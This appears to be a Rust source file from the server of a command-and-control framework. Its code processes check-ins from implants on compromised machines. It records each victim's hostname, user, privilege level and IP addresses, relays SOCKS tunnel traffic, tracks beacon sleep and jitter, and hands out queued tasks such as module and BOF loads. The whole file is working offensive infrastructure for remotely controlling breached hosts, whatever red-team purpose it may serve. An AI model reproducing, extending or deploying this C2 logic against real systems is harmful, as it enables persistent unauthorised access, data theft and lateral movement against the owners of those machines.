use base64::Engine as _;
use specter_common::checkin::{
    parse_binary_checkin, serialize_binary_response, CheckinRequest, CheckinResponse,
    PendingTaskPayload,
};

use super::HttpState;

#[derive(Debug, Clone)]
pub enum SessionBinding {
    Metadata,
    Existing(String),
    ImplantPubkey([u8; 32]),
}

#[derive(Debug, Clone, Copy)]
pub struct CheckinOptions {
    pub defer_module_payloads: bool,
}

#[derive(Debug)]
pub struct ParsedCheckin {
    pub request: CheckinRequest,
    pub is_binary: bool,
}

#[derive(Debug)]
pub struct CheckinProcessor {
    pub response: CheckinResponse,
    pub is_binary: bool,
}

impl CheckinProcessor {
    pub fn response_bytes(&self) -> Result<Vec<u8>, serde_json::Error> {
        if self.is_binary {
            Ok(serialize_binary_response(&self.response))
        } else {
            serde_json::to_vec(&self.response)
        }
    }
}

pub fn parse_plaintext_checkin(plaintext: &[u8]) -> Option<ParsedCheckin> {
    if let Some(request) = parse_binary_checkin(plaintext) {
        Some(ParsedCheckin {
            request,
            is_binary: true,
        })
    } else if let Ok(request) = serde_json::from_slice::<CheckinRequest>(plaintext) {
        Some(ParsedCheckin {
            request,
            is_binary: false,
        })
    } else {
        None
    }
}

pub async fn process_checkin(
    state: &HttpState,
    request: CheckinRequest,
    is_binary: bool,
    binding: SessionBinding,
    options: CheckinOptions,
) -> Result<CheckinProcessor, sqlx::Error> {
    let session_id = match binding {
        SessionBinding::Existing(id) => {
            state.session_manager.update_checkin(&id).await?;
            id
        }
        SessionBinding::ImplantPubkey(pubkey) => {
            state
                .session_manager
                .register_or_update_with_pubkey(
                    &request.hostname,
                    &request.username,
                    request.pid,
                    &request.os_version,
                    &request.integrity_level,
                    &request.process_name,
                    &request.internal_ip,
                    &request.external_ip,
                    &pubkey,
                )
                .await?
        }
        SessionBinding::Metadata => {
            state
                .session_manager
                .register_or_update(
                    &request.hostname,
                    &request.username,
                    request.pid,
                    &request.os_version,
                    &request.integrity_level,
                    &request.process_name,
                    &request.internal_ip,
                    &request.external_ip,
                )
                .await?
        }
    };

    for tr in &request.task_results {
        let success = tr.status == "COMPLETE";
        if tr.task_id == "socks_data" {
            if success {
                match base64::engine::general_purpose::STANDARD.decode(tr.result.as_bytes()) {
                    Ok(data) => {
                        if let Some(socks_manager) = state.socks_manager.as_ref() {
                            socks_manager.route_message(&session_id, &data).await;
                        }
                    }
                    Err(e) => {
                        tracing::warn!("Failed to decode SOCKS module output: {e}");
                    }
                }
            }
            continue;
        }

        if let Some(socks_manager) = state.socks_manager.as_ref() {
            socks_manager
                .mark_started_task_result(&session_id, &tr.task_id, success)
                .await;
        }

        if let Err(e) = state
            .task_dispatcher
            .complete_task(&tr.task_id, tr.result.as_bytes(), success)
            .await
        {
            tracing::warn!("Failed to complete task {}: {e}", tr.task_id);
        }

        if success {
            if let Some((interval, jitter)) = parse_sleep_result(&tr.result) {
                if let Err(e) = state
                    .session_manager
                    .update_sleep_config(&session_id, interval, jitter)
                    .await
                {
                    tracing::warn!("Failed to update sleep metadata for session {session_id}: {e}");
                }
            }
        }
    }

    let pending = state
        .task_dispatcher
        .get_pending_tasks(&session_id)
        .await
        .unwrap_or_default();
    let mut tasks = Vec::new();
    for t in &pending {
        if let Err(e) = state.task_dispatcher.mark_dispatched(&t.id).await {
            tracing::warn!("Failed to mark task {} dispatched: {e}", t.id);
        }

        let (task_type, arguments) = if options.defer_module_payloads
            && state.module_repository.is_some()
            && matches!(
                t.task_type.as_str(),
                "load_module" | "module_load" | "bof" | "bof_load"
            ) {
            ("load_module".to_string(), t.arguments.clone())
        } else {
            (t.task_type.clone(), t.arguments.clone())
        };

        tasks.push(PendingTaskPayload {
            task_id: t.id.clone(),
            task_type,
            arguments,
        });
    }

    Ok(CheckinProcessor {
        response: CheckinResponse { session_id, tasks },
        is_binary,
    })
}

/// Parse sleep task result text in the form "interval=30s jitter=15%".
fn parse_sleep_result(result: &str) -> Option<(u32, u32)> {
    if !result.contains("interval=") {
        return None;
    }

    let mut interval = 0u32;
    let mut jitter = 0u32;
    for part in result.split_whitespace() {
        if let Some(val) = part
            .strip_prefix("interval=")
            .and_then(|s| s.strip_suffix('s'))
        {
            interval = val.parse().unwrap_or(0);
        }
        if let Some(val) = part
            .strip_prefix("jitter=")
            .and_then(|s| s.strip_suffix('%'))
        {
            jitter = val.parse().unwrap_or(0);
        }
    }

    if interval > 0 {
        Some((interval, jitter))
    } else {
        None
    }
}
